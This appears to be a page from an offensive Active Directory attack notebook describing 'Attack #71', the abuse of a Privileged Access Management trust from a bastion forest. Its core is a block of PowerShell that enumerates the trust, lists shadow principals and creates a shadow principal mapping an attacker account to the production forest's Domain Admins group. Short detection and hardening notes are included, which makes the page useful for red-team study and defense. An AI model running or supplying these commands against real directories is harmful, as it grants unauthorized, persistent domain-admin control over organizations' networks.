---
title: "Attack #71 — PAM Trust Abuse (Bastion Forest)"
description: "Get-ADTrust -Filter {TrustType -eq \"ForestTransitive\"} | Where ForestTransitive -eq $true netdom trust corp.local /domain:bastion.local /verify"
category: active-directory
tags: ["active-directory", "privilege-escalation"]
tools: ["PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Nine/🔶 Attack #71 — PAM Trust Abuse (Bastion Forest).md"
---
# 🔶 Attack #71 — PAM Trust Abuse (Bastion Forest)

***

## 📖 How It Works

**Privileged Access Management (PAM) trust** is a special forest trust type introduced in Server 2016 for **bastion forest** architectures. It enables time-limited group memberships via "shadow principals" — users in the bastion forest get temporary membership in privileged groups of the production forest. If the bastion forest is compromised, or if the PAM trust is misconfigured, an attacker can abuse shadow principals to gain persistent, time-unlimited admin access to the production forest.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **PAM trust exists** | Between production and bastion forest |
| **Compromise bastion forest** | Or misconfigured PAM trust |

***

## 💻 Full Commands

```powershell
# ── Enumerate PAM trust ───────────────────────────────────────────────────────
Get-ADTrust -Filter {TrustType -eq "ForestTransitive"} | Where ForestTransitive -eq $true
netdom trust corp.local /domain:bastion.local /verify

# ── Find shadow principals ───────────────────────────────────────────────────
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" \
  -Filter * -Properties *

# ── If bastion is compromised — create shadow principal mapping ──────────────
# From bastion forest as DA:
New-ADObject -Type "msDS-ShadowPrincipal" -Name "shadow-DA" \
  -Path "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" \
  -OtherAttributes @{
    'msDS-ShadowPrincipalSid' = (Get-ADGroup "Domain Admins" -Server corp.local).SID
    'member' = (Get-ADUser attacker -Server bastion.local).DistinguishedName
  }
# attacker in bastion forest now has DA rights in corp.local production forest
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Authentication via PAM trust from bastion forest |
| **5136** | Security Log | Shadow principal creation/modification |

***

## 🔗 Attack Chain Context

```
[PAM Trust] ──→ Bastion Forest Compromise → Production Forest Admin
         │
         ├──→ ⚠️ Rare — only exists in environments with Server 2016+ bastion forests
         ├──→ 🔗 Shadow principals = temporary group membership across trusts
         └──→ 💀 Defeated by: harden bastion forest, monitor shadow principal changes
```

***

> ✅ **Attack #71 — PAM Trust Abuse complete.**

***

> 🏁 **Category 9 — Trust & Forest Attacks is now COMPLETE (4/4 attacks).**
